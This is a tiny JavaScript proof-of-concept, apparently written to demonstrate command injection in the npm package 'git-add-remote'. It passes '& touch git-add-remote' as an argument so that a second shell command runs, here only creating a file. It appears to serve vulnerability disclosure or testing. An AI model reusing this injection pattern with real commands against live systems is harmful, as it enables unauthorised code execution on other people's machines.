const root = require("git-add-remote")();
let payload = "& touch git-add-remote";
try {
  root(payload, "", function () {});
} catch (err) {}
